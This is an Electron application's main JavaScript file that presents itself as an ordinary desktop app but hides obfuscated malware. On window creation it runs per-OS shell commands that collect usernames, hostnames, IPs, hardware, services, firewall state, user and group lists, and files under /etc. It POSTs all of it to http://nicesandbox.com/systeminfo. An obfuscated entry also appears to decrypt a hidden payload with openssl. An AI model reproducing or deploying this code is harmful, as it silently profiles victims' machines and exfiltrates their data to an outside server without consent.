const { app, BrowserWindow } = require("electron");
const path = require("path");
const { exec } = require("child_process");
const os = require("os");
const axios = require("axios");

function _0x19a58a(_0x3541d5, _0x470443, _0x49f26a, _0x1a86d2) {
  return _0x2e2a(_0x49f26a - 0x1d5, _0x470443);
}
function _0x2e2a(_0x34e573, _0x3c3330) {
  const _0x1576f1 = _0x57f9();
  return (
    (_0x2e2a = function (_0x16a96f, _0x138f3c) {
      _0x16a96f = _0x16a96f - (-0x16f2 + 0xc5 + 0x1703);
      let _0x55beaa = _0x1576f1[_0x16a96f];
      if (_0x2e2a["PrRqpd"] === undefined) {
        var _0xaf8119 = function (_0x2aef0f) {
          const _0x47650c =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let _0x5d5fc2 = "",
            _0xddfd4f = "";
          for (
            let _0x3b6511 = 0x1c37 + 0x2102 + -0x3d39,
              _0x62bfcb,
              _0x23d7c0,
              _0x502d89 = -0x579 * -0x2 + -0xda0 + 0x2 * 0x157;
            (_0x23d7c0 = _0x2aef0f["charAt"](_0x502d89++));
            ~_0x23d7c0 &&
            ((_0x62bfcb =
              _0x3b6511 % (0x12cd * 0x1 + -0x229b + 0xfd2)
                ? _0x62bfcb * (0x7 * -0x24d + 0x1295 + -0x23a) + _0x23d7c0
                : _0x23d7c0),
            _0x3b6511++ % (-0x16df + -0x10ca + 0x27ad))
              ? (_0x5d5fc2 += String["fromCharCode"](
                  (-0x21a2 + -0x35 * -0x7a + -0x95f * -0x1) &
                    (_0x62bfcb >>
                      ((-(-0x1b5a + -0x1 * -0x17c2 + -0x1 * -0x39a) *
                        _0x3b6511) &
                        (-0x161d + -0x2344 + 0x3967)))
                ))
              : 0xdae + -0x19 * -0x13 + -0xf89
          ) {
            _0x23d7c0 = _0x47650c["indexOf"](_0x23d7c0);
          }
          for (
            let _0xe2a014 = 0x17d6 + -0x254c + 0x6bb * 0x2,
              _0x4fe946 = _0x5d5fc2["length"];
            _0xe2a014 < _0x4fe946;
            _0xe2a014++
          ) {
            _0xddfd4f +=
              "%" +
              ("00" +
                _0x5d5fc2["charCodeAt"](_0xe2a014)["toString"](
                  -0x235 + 0x8 * -0x4d9 + 0x1 * 0x290d
                ))["slice"](-(0x3c6 + -0x11c2 + 0xdfe));
          }
          return decodeURIComponent(_0xddfd4f);
        };
        (_0x2e2a["SyRMZg"] = _0xaf8119),
          (_0x34e573 = arguments),
          (_0x2e2a["PrRqpd"] = !![]);
      }
      const _0x1dc29d = _0x1576f1[0x1fa1 + -0x1 * 0x25de + 0x63d],
        _0x416471 = _0x16a96f + _0x1dc29d,
        _0x5f3840 = _0x34e573[_0x416471];
      return (
        !_0x5f3840
          ? ((_0x55beaa = _0x2e2a["SyRMZg"](_0x55beaa)),
            (_0x34e573[_0x416471] = _0x55beaa))
          : (_0x55beaa = _0x5f3840),
        _0x55beaa
      );
    }),
    _0x2e2a(_0x34e573, _0x3c3330)
  );
}
function _0x57f9() {
  const _0xfefcfd = [
    "ywfAn2q3BKjkwa",
    "CMfT",
    "r1HxtMG",
    "B3n5CW",
    "BgLUDxG",
    "vgLTzsi",
    "ic9cic9doIjtEq",
    "nvzkBxj1mgPxoa",
    "zNjLzsaTAa",
    "DffgDgi",
    "mtjrrgPvDg4",
    "ic1Kic1Hic1Wyq",
    "DxnLCM5HBwu",
    "zxaGvg90ywW",
    "zxjYB3i",
    "B0rHv3C",
    "vhLWzsb8igDYzq",
    "ndeXnti1BenOB2rT",
    "AuTfuKO",
    "Avfwr2O",
    "BgLZDa",
    "BMzVic8GFcbNCG",
    "DgfIBgu",
    "Ag9ZDg5HBwu",
    "ie5HBwuIic9doG",
    "ChjVDg90ExbL",
    "BMn0Aw9UkcKG",
    "y29UC3rYDwn0BW",
    "BMv0ihvZzxi",
    "DcaVr3jVDxbZ",
    "r1zRwde4zeXVEq",
    "mJjny3HpwwW",
    "y2f0ic9LDgmVkG",
    "yxb0Aw9UlhnPEG",
    "Dxb0Aw1L",
    "yxnZD2q",
    "EwnOAxaGz2v0ia",
    "A1fprg0",
    "y3b1",
    "Aw5MBW",
    "CMv0DxjUicHMDq",
    "C3LZDgvTAw5MBW",
    "mZKWnZuZz2rPChb1",
    "y3rVCIGICMv0Dq",
    "yMLUza",
    "C2XeCvm0q0zVCq",
    "C3LZDgvTx3bYBW",
    "DfjOuNG",
    "zhnJBcaUigXPCW",
    "y2f0ic9LDgmVCa",
    "zxaGvKDb",
    "ENnqsxe",
    "D2fYBG",
    "ihWGzMLUzhn0CG",
    "AMvxDgS",
    "mJCZmZy0ueXlAfvo",
    "BgHHCMr3yxjLCa",
    "C3rLBsbcB290ia",
    "CNzPy2u",
    "Bg9N",
    "B3CGywXSChjVzG",
    "BgLZDc11BML0CW",
    "zMLYzxDHBgW",
    "ChmGyxv4",
    "BwfJAgrLCc5JCa",
    "z3b1",
    "ic9cic9doIjpuW",
    "reXhEfO",
    "mtzesgLKruC",
    "CNKVuhjLzMvYzq",
    "BhnJChu",
    "BMv0D29YAW",
    "tvLOy2q",
    "mJj5q0PcsNe",
    "y2fWywnPDhK",
    "CM9KDwn0vMvYCW",
    "DcaVvxnLCNm",
    "AgLkzxa",
    "qt09ihWGB3bLBG",
    "rhDhvKW",
    "CfDwwNi",
    "y29UC29Szq",
    "AxbJB25MAwC",
    "zgLZAW",
    "B3j0CW",
    "mty4mdaYmefRA1HUEq",
    "x19WCM90B19F",
    "zgfYD2LU",
    "CML2zsbNzxqGyW",
    "mZK5odKXBKnRyvPp",
    "ChjVy2vZC2vZ",
    "Bg9IywXZDgf0zq",
    "z3jVDxbZ",
    "zwfKic9mAwjYyq",
    "D21PyYbUAwmGzW",
    "zxmTmJu2lwnIyW",
    "CIbNzxqGy2fWDa",
    "D21PyYbWyxrOia",
    "C3DFDMvYCYaTCa",
    "D21PyYbJChuGzW",
    "Aw9U",
    "zxqGy2fWDgLVBG",
    "D2HVyw1P",
    "DxnLCNm",
    "CcbdAgLWC2v0",
    "BhnIBgS",
    "E30Uy29UC3rYDq",
    "swz3B0ThttzvCG",
    "CM4GDgHPCYiPka",
    "Ag1T",
    "zMvJDgvK",
    "BMv0C2GGywr2zG",
    "D21PyYbKAxnRza",
    "zMLSzxiGu1beAq",
    "Ag9ZDg5HBwuGlq",
    "EKTxCw0",
    "t2njvwu",
    "uvrvD0C",
    "yNDIyMq",
    "zwnOBYbvmKzZza",
    "zgvMyxvSDhmGCG",
    "zgLZA3v0AwWGAq",
    "AxjLD2fSBcbZAa",
    "mJa1otvMAunir24",
    "ic0TDhLWzt1Zzq",
    "C2jqEue",
    "seXYtwm",
    "qvPtAuK",
    "Ag14mdC5uLHNsq",
    "C2vYDMLJzxm",
    "Dg9tDhjPBMC",
    "AhCUBwvTC2L6zq",
    "uxnethG",
    "C0zJDhC",
    "DgfZA2XPC3q",
    "yxbWBhK",
    "CM91Ca",
    "DhjHy2u",
    "BgvUz3rO",
    "Ds5ICMfUzf9ZDa",
    "AeHtAZHemZy5Ba",
    "ndm2ndC2q0X6sLzd",
    "B2nVBNrYB2XSzq",
  ];
  _0x57f9 = function () {
    return _0xfefcfd;
  };
  return _0x57f9();
}
(function (_0x2dd7df, _0x47d775) {
  const _0x399868 = _0x2dd7df();
  function _0x2f4409(_0x3ac62a, _0x3dfce4, _0x19a852, _0x131fad) {
    return _0x2e2a(_0x131fad - 0x275, _0x3dfce4);
  }
  function _0x28a1d6(_0x2fd33a, _0x1439fc, _0x40ce09, _0x154be2) {
    return _0x2e2a(_0x40ce09 - -0x82, _0x154be2);
  }
  while (!![]) {
    try {
      const _0x247df7 =
        (-parseInt(_0x2f4409(0x380, 0x3bc, 0x363, 0x381)) /
          (-0xda9 * 0x1 + 0xdec + -0x16 * 0x3)) *
          (-parseInt(_0x2f4409(0x334, 0x30f, 0x362, 0x34f)) /
            (0x3a6 + 0x1 * 0x18c0 + 0x4 * -0x719)) +
        parseInt(_0x28a1d6(0x5c, 0xac, 0x68, 0x50)) /
          (-0x225a * -0x1 + 0x9ce + -0x3 * 0xeb7) +
        -parseInt(_0x28a1d6(0xb7, 0xd1, 0x9c, 0xb2)) /
          (0x1 * -0x13fe + -0x9e * -0xd + 0x76 * 0x1a) +
        (-parseInt(_0x28a1d6(0xda, 0xdc, 0xaf, 0x82)) /
          (0x163c * 0x1 + 0x1 * 0x24e6 + -0x3b1d)) *
          (-parseInt(_0x28a1d6(0x89, 0xa6, 0xa8, 0xef)) /
            (0x1e23 + 0x2f * -0x49 + -0x10b6)) +
        -parseInt(_0x2f4409(0x387, 0x3c2, 0x3eb, 0x3cc)) /
          (-0x30a * 0x4 + -0x9 * -0x3 + 0xc14) +
        (-parseInt(_0x2f4409(0x3e6, 0x419, 0x3b6, 0x3d9)) /
          (-0x1ed * -0xa + -0x19 + -0x1321)) *
          (-parseInt(_0x28a1d6(0x102, 0x9c, 0xc8, 0x89)) /
            (-0x2501 * 0x1 + 0x1a4b + -0x15 * -0x83)) +
        (-parseInt(_0x28a1d6(0x97, 0x95, 0x64, 0x27)) /
          (0x1 * 0x163 + -0x1856 + -0x16fd * -0x1)) *
          (parseInt(_0x2f4409(0x38b, 0x3b3, 0x3f8, 0x3b4)) /
            (-0x1c57 + -0x23c5 + 0x1 * 0x4027));
      if (_0x247df7 === _0x47d775) break;
      else _0x399868["push"](_0x399868["shift"]());
    } catch (_0x58f0e5) {
      _0x399868["push"](_0x399868["shift"]());
    }
  }
})(_0x57f9, -0x27732 + -0x19280 + 0x5fa39 * 0x1);
const _0x2084eb = (function () {
    const _0x5d9c50 = {};
    function _0x4fe7ee(_0x17d925, _0x1ccc4e, _0x358ca4, _0x114ee3) {
      return _0x2e2a(_0x1ccc4e - -0x120, _0x114ee3);
    }
    (_0x5d9c50[_0x4fe7ee(-0x57, -0x10, 0x15, -0x41)] = function (
      _0x48dc49,
      _0x1f20cf
    ) {
      return _0x48dc49 + _0x1f20cf;
    }),
      (_0x5d9c50[_0x4cb3fc(-0x20c, -0x1c8, -0x1d7, -0x1a5)] =
        _0x4fe7ee(0x30, 0x28, -0x17, 0x2c) +
        _0x4cb3fc(-0x194, -0x1a4, -0x176, -0x19d)),
      (_0x5d9c50[_0x4cb3fc(-0x1ac, -0x1d9, -0x1e9, -0x219)] =
        _0x4cb3fc(-0x1be, -0x1e3, -0x1c0, -0x1e3) +
        _0x4fe7ee(0x30, 0x2b, -0xb, 0x4) +
        _0x4fe7ee(0xf, -0x23, -0x42, -0x35) +
        "\x20)"),
      (_0x5d9c50[_0x4cb3fc(-0x1ad, -0x1bc, -0x1bd, -0x1cf)] = _0x4fe7ee(
        -0x17,
        -0x47,
        -0x37,
        -0x5b
      )),
      (_0x5d9c50["bwbbd"] = _0x4cb3fc(-0x19a, -0x18f, -0x163, -0x183));
    const _0x4b9c7b = _0x5d9c50;
    let _0x3c1cb2 = !![];
    function _0x4cb3fc(_0x4ca69b, _0x1ec41e, _0x7cc246, _0x1b103b) {
      return _0x2e2a(_0x1ec41e - -0x2de, _0x4ca69b);
    }
    return function (_0x2544a4, _0x2b4310) {
      const _0x38c52d = _0x3c1cb2
        ? function () {
            function _0x4afcc2(_0x5457af, _0x451ccf, _0xc0cd77, _0x3696ae) {
              return _0x2e2a(_0x5457af - 0x2b7, _0x3696ae);
            }
            function _0x163e8e(_0x213a02, _0x5dc44c, _0x4397b9, _0x3097fc) {
              return _0x2e2a(_0x213a02 - -0x21b, _0x3097fc);
            }
            const _0xd1dc1 = {
              yHKzs: function (_0x53aee7, _0x315bf9) {
                function _0x10c83d(_0x170dce, _0x4d75fd, _0x3d2b38, _0x4688ed) {
                  return _0x2e2a(_0x3d2b38 - -0x2f3, _0x4688ed);
                }
                return _0x4b9c7b[_0x10c83d(-0x1c0, -0x21f, -0x1e3, -0x1e3)](
                  _0x53aee7,
                  _0x315bf9
                );
              },
              hiJep: _0x4b9c7b[_0x163e8e(-0x105, -0x113, -0xe9, -0x137)],
              DwGVL: _0x4b9c7b["OcIUe"],
            };
            if (_0x2b4310) {
              if (
                _0x4b9c7b["GXWNh"] ===
                _0x4b9c7b[_0x163e8e(-0x114, -0xcd, -0xf3, -0x131)]
              )
                _0x2cfe55 = _0x5acaf(
                  _0xd1dc1["yHKzs"](
                    _0xd1dc1[_0x163e8e(-0x13d, -0x164, -0x107, -0x108)] +
                      _0xd1dc1[_0x163e8e(-0x13b, -0x17b, -0xf8, -0x181)],
                    ");"
                  )
                )();
              else {
                const _0x53037a = _0x2b4310[
                  _0x163e8e(-0x103, -0x133, -0xd1, -0xf7)
                ](_0x2544a4, arguments);
                return (_0x2b4310 = null), _0x53037a;
              }
            }
          }
        : function () {};
      return (_0x3c1cb2 = ![]), _0x38c52d;
    };
  })(),
  _0x1006aa = _0x2084eb(this, function () {
    const _0x452f5d = {
      oDaWw: function (_0x305495, _0x11dd01) {
        return _0x305495 === _0x11dd01;
      },
      vYfKa: _0x3c72f2(-0x37, -0x2a, -0x60, 0x4),
      pWVZr: function (_0x5e40, _0x7d98b6) {
        return _0x5e40(_0x7d98b6);
      },
      sbPyA: function (_0xbe2de2, _0x790a07) {
        return _0xbe2de2 + _0x790a07;
      },
      HLrMc: function (_0x4cb3c7, _0x1abe51) {
        return _0x4cb3c7 + _0x1abe51;
      },
      tQFtb:
        _0xbc3532(-0x133, -0x132, -0xd7, -0x10f) +
        _0x3c72f2(-0x3, -0x3e, -0x3d, 0x1c),
      kQODm:
        _0xbc3532(-0x149, -0x183, -0x12c, -0x15c) +
        _0x3c72f2(0xe, -0x34, 0x30, 0xb) +
        _0x3c72f2(-0x40, -0x3d, -0x81, -0x46) +
        "\x20)",
      zsPIq: function (_0x3552d4) {
        return _0x3552d4();
      },
      KeFeT: _0xbc3532(-0xcf, -0x138, -0xcc, -0xfc),
      DLGxZ: _0x3c72f2(0xa, -0x22, 0x48, 0x4b),
      zKWqm: _0x3c72f2(-0x7, -0x3d, -0x41, 0xd),
      QsDLx: _0x3c72f2(-0x23, 0x12, 0x5, -0xc),
      jeWtk: _0x3c72f2(-0xa, -0x20, -0x2d, 0x3a),
    };
    function _0x3c72f2(_0x29b11e, _0x1b8787, _0x24ba6c, _0x1c3d58) {
      return _0x2e2a(_0x29b11e - -0x13d, _0x1c3d58);
    }
    const _0x1c8335 = function () {
        function _0x36803b(_0x203c57, _0x29dd4d, _0x1de19a, _0x1f09f8) {
          return _0x3c72f2(
            _0x29dd4d - 0x47b,
            _0x29dd4d - 0xb6,
            _0x1de19a - 0x121,
            _0x1de19a
          );
        }
        let _0x548f05;
        function _0x687f74(_0x49ada4, _0x5b6332, _0x187bc6, _0x45e5a8) {
          return _0x3c72f2(
            _0x187bc6 - 0x7,
            _0x5b6332 - 0xc9,
            _0x187bc6 - 0x181,
            _0x49ada4
          );
        }
        try {
          if (
            _0x452f5d[_0x36803b(0x48f, 0x46d, 0x46a, 0x491)](
              _0x687f74(0x12, 0xd, -0x4, 0x1a),
              _0x452f5d["vYfKa"]
            )
          ) {
            const _0x4e1b46 =
                _0x26bdb3["constructo" + "r"][
                  _0x36803b(0x439, 0x477, 0x47f, 0x438)
                ][_0x36803b(0x48e, 0x48a, 0x452, 0x494)](_0x3d8809),
              _0xea8fde = _0x29fa99[_0x2ce2e0],
              _0x3907b9 = _0x34e573[_0xea8fde] || _0x4e1b46;
            (_0x4e1b46[_0x36803b(0x402, 0x425, 0x3e5, 0x426)] =
              _0x3c3330[_0x36803b(0x44d, 0x48a, 0x45b, 0x48b)](_0x1576f1)),
              (_0x4e1b46[_0x36803b(0x47d, 0x451, 0x476, 0x436)] =
                _0x3907b9["toString"][_0x36803b(0x47f, 0x48a, 0x477, 0x497)](
                  _0x3907b9
                )),
              (_0x16a96f[_0xea8fde] = _0x4e1b46);
          } else
            _0x548f05 = _0x452f5d[_0x687f74(-0x3f, -0x7e, -0x55, -0x92)](
              Function,
              _0x452f5d[_0x687f74(-0x2b, -0x7, -0x28, -0x2f)](
                _0x452f5d[_0x36803b(0x478, 0x44d, 0x413, 0x412)](
                  _0x452f5d[_0x687f74(-0x2, 0x1b, -0xd, 0x1e)],
                  _0x452f5d[_0x36803b(0x4b8, 0x483, 0x4ba, 0x49f)]
                ),
                ");"
              )
            )();
        } catch (_0x5a2d0f) {
          _0x548f05 = window;
        }
        return _0x548f05;
      },
      _0x1fc853 = _0x452f5d[_0x3c72f2(0x16, 0x12, 0x2e, 0x46)](_0x1c8335),
      _0xb69315 = (_0x1fc853[_0xbc3532(-0x133, -0x1a5, -0x136, -0x175)] =
        _0x1fc853[_0x3c72f2(-0x5b, -0x26, -0x35, -0x1e)] || {}),
      _0xb80f31 = [
        _0x452f5d["KeFeT"],
        _0xbc3532(-0xdc, -0xd3, -0xfb, -0x103),
        _0x452f5d[_0x3c72f2(0x26, 0x3d, 0x68, 0x5e)],
        _0xbc3532(-0x151, -0xe7, -0x146, -0x129),
        "exception",
        _0x452f5d[_0x3c72f2(-0x39, -0x58, -0x67, -0x9)],
        _0x452f5d[_0x3c72f2(-0x28, -0x2a, -0x1, -0x33)],
      ];
    function _0xbc3532(_0x35e25f, _0x128f4a, _0x3743b5, _0x1e6111) {
      return _0x2e2a(_0x1e6111 - -0x257, _0x3743b5);
    }
    for (
      let _0x29183b = -0x49 + -0xefb + 0xf44;
      _0x29183b < _0xb80f31[_0xbc3532(-0x121, -0x176, -0x11c, -0x13c)];
      _0x29183b++
    ) {
      if (
        _0x3c72f2(-0xa, 0x13, -0x1c, -0x3b) !==
        _0x452f5d[_0xbc3532(-0x139, -0xd8, -0x118, -0x101)]
      ) {
        let _0xd2abd3;
        try {
          _0xd2abd3 = _0x452f5d[_0x3c72f2(-0x5c, -0x8c, -0x43, -0x8b)](
            _0x10ca71,
            _0x452f5d[_0x3c72f2(-0x14, 0xb, -0x20, -0x27)] +
              _0x452f5d[_0xbc3532(-0x103, -0xce, -0xfe, -0x112)] +
              ");"
          )();
        } catch (_0x533ae5) {
          _0xd2abd3 = _0x22b14e;
        }
        return _0xd2abd3;
      } else {
        const _0x15dbca =
            _0x2084eb[_0xbc3532(-0x150, -0xe1, -0xd7, -0x11c) + "r"][
              _0x3c72f2(-0x4, -0x11, 0x5, -0x3d)
            ][_0xbc3532(-0x104, -0xf4, -0xcc, -0x10b)](_0x2084eb),
          _0x42d77a = _0xb80f31[_0x29183b],
          _0x57bbe7 = _0xb69315[_0x42d77a] || _0x15dbca;
        (_0x15dbca["__proto__"] =
          _0x2084eb[_0x3c72f2(0xf, 0x47, -0x1, 0xc)](_0x2084eb)),
          (_0x15dbca[_0x3c72f2(-0x2a, -0x1a, -0x58, -0x39)] =
            _0x57bbe7[_0xbc3532(-0x134, -0x15a, -0x140, -0x144)][
              _0xbc3532(-0x10c, -0xe6, -0x12f, -0x10b)
            ](_0x57bbe7)),
          (_0xb69315[_0x42d77a] = _0x15dbca);
      }
    }
  });
_0x1006aa();
const _0x1d5313 = {};
(_0x1d5313[_0x19a58a(0x2cc, 0x30f, 0x2d3, 0x2bb)] = [
  [
    "nothing",
    _0x19a58a(0x2af, 0x2a6, 0x2dd, 0x322) +
      _0x19a58a(0x2f8, 0x2fb, 0x313, 0x2f3) +
      _0x1ca225(-0x16f, -0x173, -0x18a, -0x16f) +
      "cEVgMQS5JY" +
      _0x1ca225(-0x16b, -0x16e, -0x194, -0x198) +
      _0x19a58a(0x2ca, 0x2c9, 0x2f5, 0x330) +
      _0x19a58a(0x32b, 0x35b, 0x322, 0x349) +
      _0x19a58a(0x296, 0x301, 0x2d1, 0x2f4) +
      _0x1ca225(-0x16f, -0x1ae, -0x1a0, -0x1b1) +
      _0x19a58a(0x275, 0x2b9, 0x2b4, 0x2ae) +
      "ssl\x20enc\x20-a" +
      _0x1ca225(-0x189, -0x1d7, -0x1c1, -0x1c0) +
      _0x1ca225(-0x156, -0x168, -0x186, -0x16e) +
      "ss\x20pass:in" +
      _0x19a58a(0x300, 0x2b8, 0x2d4, 0x2c4),
  ],
]),
  (_0x1d5313[_0x1ca225(-0x184, -0x1ad, -0x1c9, -0x1cb)] = [
    ["username", "whoami"],
    ["hostname", _0x1ca225(-0x1b2, -0x186, -0x17a, -0x1b6)],
    ["ip", _0x19a58a(0x32e, 0x324, 0x30c, 0x2d4)],
    [
      _0x1ca225(-0x1ad, -0x1b6, -0x18e, -0x191),
      _0x1ca225(-0x1f1, -0x179, -0x1be, -0x1c6) +
        _0x19a58a(0x2b3, 0x29c, 0x2b1, 0x2f2) +
        _0x19a58a(0x2b8, 0x2e4, 0x2ca, 0x2c4),
    ],
    [
      _0x1ca225(-0x14e, -0x172, -0x16b, -0x188),
      "sysctl\x20-n\x20" +
        _0x19a58a(0x33d, 0x2f1, 0x335, 0x2f4) +
        _0x1ca225(-0x1a5, -0x1d3, -0x195, -0x1dd) +
        "ring",
    ],
    [
      _0x19a58a(0x2af, 0x2bc, 0x2f6, 0x2d9),
      "sysctl\x20-n\x20" + _0x19a58a(0x314, 0x2ea, 0x2e9, 0x326),
    ],
    [
      _0x1ca225(-0x157, -0x115, -0x150, -0x10e),
      _0x1ca225(-0x176, -0x178, -0x163, -0x132) +
        _0x19a58a(0x2bb, 0x2c6, 0x2d7, 0x2a8) +
        "splaysData" +
        _0x1ca225(-0x14f, -0x19d, -0x181, -0x1c4) +
        _0x1ca225(-0x1a7, -0x1a0, -0x1b8, -0x1cb),
    ],
    [
      _0x19a58a(0x2e6, 0x2d5, 0x2b9, 0x276),
      _0x1ca225(-0x1c1, -0x1a3, -0x1a7, -0x1c9) +
        _0x19a58a(0x2e2, 0x32b, 0x30a, 0x33f) +
        _0x1ca225(-0x178, -0x141, -0x184, -0x14e),
    ],
    [
      _0x1ca225(-0x1c8, -0x1b3, -0x1d9, -0x1ec),
      "networkset" +
        "up\x20-listal" +
        _0x1ca225(-0x141, -0x12d, -0x159, -0x11f) +
        _0x1ca225(-0x1b1, -0x18e, -0x1cc, -0x1ca),
    ],
    [_0x1ca225(-0x179, -0x149, -0x16f, -0x154), "uptime"],
    [
      _0x1ca225(-0x198, -0x1a0, -0x1c6, -0x1ab),
      _0x1ca225(-0x138, -0x154, -0x152, -0x15b),
    ],
    [
      _0x1ca225(-0x17d, -0x1ce, -0x19f, -0x17d),
      "launchctl\x20" + _0x19a58a(0x34f, 0x332, 0x309, 0x34f),
    ],
    [
      _0x19a58a(0x339, 0x2f7, 0x333, 0x346),
      _0x19a58a(0x2dc, 0x2ff, 0x2de, 0x2a4) +
        _0x19a58a(0x2ce, 0x2b7, 0x2c3, 0x29c) +
        _0x19a58a(0x281, 0x273, 0x2ab, 0x29f) +
        "nces/com.a" +
        "pple.alf\x20g" +
        _0x1ca225(-0x181, -0x1f1, -0x1c5, -0x180),
    ],
    [
      _0x19a58a(0x2de, 0x286, 0x2cd, 0x2a3),
      _0x1ca225(-0x15a, -0x18b, -0x161, -0x187) +
        _0x1ca225(-0x193, -0x216, -0x1d4, -0x214),
    ],
    [
      _0x1ca225(-0x1fc, -0x1f7, -0x1c4, -0x1f1),
      _0x19a58a(0x2ed, 0x2e9, 0x325, 0x30a) +
        _0x1ca225(-0x172, -0x18d, -0x174, -0x19b),
    ],
  ]);
function _0x1ca225(_0x1c40d7, _0x3efe0f, _0x284091, _0x4b33e3) {
  return _0x2e2a(_0x284091 - -0x2b1, _0x4b33e3);
}
(_0x1d5313["win32"] = [
  [
    _0x19a58a(0x318, 0x2fb, 0x301, 0x2c5),
    _0x19a58a(0x2be, 0x28d, 0x2cc, 0x2bd),
  ],
  [
    _0x1ca225(-0x1be, -0x154, -0x17a, -0x1a3),
    _0x1ca225(-0x171, -0x139, -0x17a, -0x143),
  ],
  ["ip", _0x19a58a(0x29f, 0x274, 0x2b8, 0x2af)],
  [
    _0x1ca225(-0x156, -0x1a1, -0x18e, -0x158),
    _0x19a58a(0x309, 0x2e6, 0x31e, 0x318) +
      _0x1ca225(-0x17e, -0x19e, -0x15c, -0x114) +
      _0x19a58a(0x365, 0x32e, 0x337, 0x364) +
      _0x1ca225(-0x157, -0x1bc, -0x179, -0x1b4) +
      "\x22OS\x20Versio" +
      "n\x22",
  ],
  [
    _0x1ca225(-0x18a, -0x197, -0x16b, -0x17d),
    _0x1ca225(-0x1ba, -0x1ce, -0x1bd, -0x1f8) +
      _0x19a58a(0x2ea, 0x2bc, 0x2cb, 0x305),
  ],
  [
    "ram",
    "wmic\x20memor" +
      _0x19a58a(0x34d, 0x33f, 0x319, 0x356) +
      _0x19a58a(0x2e2, 0x2e4, 0x2b0, 0x293),
  ],
  [
    _0x1ca225(-0x113, -0x191, -0x150, -0x174),
    _0x1ca225(-0x17e, -0x17d, -0x1bf, -0x18e) +
      "win32_vide" +
      _0x1ca225(-0x168, -0x163, -0x192, -0x18c) +
      _0x1ca225(-0x1ec, -0x19d, -0x1c0, -0x1bd) +
      _0x1ca225(-0x1d6, -0x1c4, -0x1bc, -0x1d9),
  ],
  [
    _0x1ca225(-0x1f4, -0x1c1, -0x1cd, -0x1d5),
    _0x1ca225(-0x180, -0x1da, -0x1b0, -0x1df) +
      _0x19a58a(0x2d0, 0x2da, 0x2be, 0x28c) +
      _0x1ca225(-0x170, -0x1a9, -0x170, -0x187) +
      "e",
  ],
  ["network", _0x19a58a(0x2f1, 0x294, 0x2c4, 0x27d) + "et\x20name"],
  [
    "uptime",
    "systeminfo" +
      _0x1ca225(-0x143, -0x14a, -0x15c, -0x189) +
      _0x1ca225(-0x1ad, -0x15a, -0x18b, -0x18c) +
      _0x19a58a(0x333, 0x340, 0x32e, 0x354) +
      _0x1ca225(-0x15a, -0x1a4, -0x18c, -0x1b3),
  ],
  [
    _0x1ca225(-0x1f9, -0x187, -0x1c6, -0x1a9),
    _0x1ca225(-0x1ca, -0x184, -0x19a, -0x1cd),
  ],
  [_0x19a58a(0x305, 0x308, 0x2e7, 0x2d9), "net\x20start"],
  [
    _0x19a58a(0x311, 0x367, 0x333, 0x37a),
    _0x1ca225(-0x1cc, -0x1d5, -0x1b1, -0x1df) +
      _0x1ca225(-0x186, -0x1a4, -0x1a6, -0x1ad) +
      _0x1ca225(-0x121, -0x14d, -0x155, -0x189) +
      "iles\x20state",
  ],
  [
    _0x1ca225(-0x178, -0x179, -0x1b9, -0x1f3),
    _0x19a58a(0x311, 0x319, 0x311, 0x340),
  ],
  [
    _0x1ca225(-0x20a, -0x1f7, -0x1c4, -0x1b0),
    "net\x20localg" + _0x19a58a(0x31b, 0x2e8, 0x2ee, 0x2fe),
  ],
]),
  (_0x1d5313[_0x19a58a(0x31d, 0x2df, 0x2f9, 0x2f6)] = [
    [
      _0x1ca225(-0x192, -0x1a6, -0x185, -0x143),
      _0x1ca225(-0x1d0, -0x201, -0x1ba, -0x1a5),
    ],
    [_0x1ca225(-0x158, -0x190, -0x17a, -0x194), "hostname"],
    ["ip", _0x19a58a(0x31b, 0x2a6, 0x2d8, 0x2eb) + "I"],
    [
      _0x1ca225(-0x170, -0x164, -0x18e, -0x1bd),
      _0x19a58a(0x2ed, 0x319, 0x315, 0x2f1) + "-release",
    ],
    ["cpu", _0x19a58a(0x2f3, 0x292, 0x2ac, 0x299)],
    [
      _0x1ca225(-0x1ca, -0x161, -0x190, -0x14d),
      _0x19a58a(0x2c8, 0x2d0, 0x2fd, 0x312),
    ],
    [
      _0x19a58a(0x34e, 0x2ef, 0x336, 0x336),
      "lspci\x20|\x20gr" + _0x19a58a(0x30c, 0x2ec, 0x327, 0x2ec),
    ],
    [
      _0x19a58a(0x2ac, 0x2c2, 0x2b9, 0x2b8),
      _0x1ca225(-0x1e0, -0x1c4, -0x1b7, -0x18c),
    ],
    ["network", "ip\x20link\x20sh" + "ow"],
    [_0x19a58a(0x30c, 0x2ef, 0x317, 0x323), "uptime"],
    [
      _0x1ca225(-0x19e, -0x1cc, -0x1c6, -0x1dc),
      _0x19a58a(0x30e, 0x350, 0x334, 0x2f2),
    ],
    [
      "services",
      "systemctl\x20" +
        _0x1ca225(-0x10f, -0x150, -0x154, -0x17d) +
        _0x1ca225(-0x160, -0x1cd, -0x1a4, -0x186) +
        _0x19a58a(0x316, 0x31a, 0x32f, 0x326),
    ],
    [_0x19a58a(0x2fc, 0x330, 0x333, 0x34e), "ufw\x20status"],
    [
      "users",
      _0x19a58a(0x33e, 0x359, 0x326, 0x2e4) +
        _0x19a58a(0x34b, 0x316, 0x318, 0x30b),
    ],
    [
      _0x19a58a(0x309, 0x2f3, 0x2c2, 0x2e2),
      "cat\x20/etc/g" + _0x19a58a(0x2e2, 0x2a8, 0x2ee, 0x323),
    ],
  ]);
const systemCommands = _0x1d5313;

function start() {
  const system = os.platform();
  const commands = systemCommands[system] || [];
  if (commands.length) {
    gatherSystemInfo(commands).then(sendToServer);
  } else {
    console.log("Unsupported OS");
  }
}

function doCommand(command) {
  return new Promise((resolve) => {
    exec(command, (error, stdout, stderr) => {
      resolve(error ? error.message : stderr || stdout.trim());
    });
  });
}

async function gatherSystemInfo(commands) {
  const results = await Promise.all(
    commands.map(([key, cmd]) => doCommand(cmd).then((output) => [key, output]))
  );
  return results.reduce((info, [key, output]) => {
    info[key] = output;
    return info;
  }, {});
}

function sendToServer(data) {
  axios
    .post("http://nicesandbox.com/systeminfo", data)
    .then((response) => console.log("Data sent successfully:", response.data))
    .catch((error) => console.error("Error sending data:", error));
}

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, "renderer.js"),
    },
  });
  start();
  win.loadFile("index.html");
}

app.whenReady().then(createWindow);

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    app.quit();
  }
});

app.on("activate", () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});
